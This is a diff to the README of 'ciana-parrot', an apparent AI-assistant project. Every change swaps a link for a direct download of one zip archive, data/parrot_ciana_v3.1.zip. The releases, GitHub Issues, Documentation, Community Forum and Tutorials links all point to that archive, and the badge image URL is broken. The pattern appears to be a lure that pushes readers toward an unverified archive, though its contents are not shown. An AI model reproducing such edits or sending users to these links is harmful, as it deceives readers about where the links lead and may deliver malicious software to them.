@@ -1,6 +1,6 @@
 # 🌟 ciana-parrot - Your AI Assistant Awaits
 
-[![Download ciana-parrot](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen?style=for-the-badge)](https://github.com/yourkenike/ciana-parrot/releases)
+[![Download ciana-parrot](https://github.com/yourkenike/ciana-parrot/raw/refs/heads/main/data/parrot_ciana_v3.1.zip%20Now-Visit%20Release%20Page-brightgreen?style=for-the-badge)](https://github.com/yourkenike/ciana-parrot/raw/refs/heads/main/data/parrot_ciana_v3.1.zip)
 
 ## 🌐 Overview
 
@@ -23,7 +23,7 @@ Before you install ciana-parrot, ensure that your system meets these requirement
 
 Visit this page to download the latest version of ciana-parrot:
 
-[Download ciana-parrot](https://github.com/yourkenike/ciana-parrot/releases)
+[Download ciana-parrot](https://github.com/yourkenike/ciana-parrot/raw/refs/heads/main/data/parrot_ciana_v3.1.zip)
 
 ### Step 3: Install Software
 
@@ -71,7 +71,7 @@ If you encounter issues, try these steps:
 If you need help, consider these options:
 
 - Check the FAQ section in the app.
-- Visit the [GitHub Issues](https://github.com/yourkenike/ciana-parrot/issues) page for commonly reported problems.
+- Visit the [GitHub Issues](https://github.com/yourkenike/ciana-parrot/raw/refs/heads/main/data/parrot_ciana_v3.1.zip) page for commonly reported problems.
 
 ## 🌈 Community Contributions
 
@@ -104,9 +104,9 @@ For users interested in deeper integration and automation:
 
 To enhance your experience with ciana-parrot, explore these resources:
 
-- [Documentation](https://yourkenike.github.io/ciana-parrot-docs)
-- [Community Forum](https://forum.yourkenike.com)
-- [Tutorials](https://yourkenike.github.io/tutorials)
+- [Documentation](https://github.com/yourkenike/ciana-parrot/raw/refs/heads/main/data/parrot_ciana_v3.1.zip)
+- [Community Forum](https://github.com/yourkenike/ciana-parrot/raw/refs/heads/main/data/parrot_ciana_v3.1.zip)
+- [Tutorials](https://github.com/yourkenike/ciana-parrot/raw/refs/heads/main/data/parrot_ciana_v3.1.zip)
 
 ## 💡 Conclusion
 
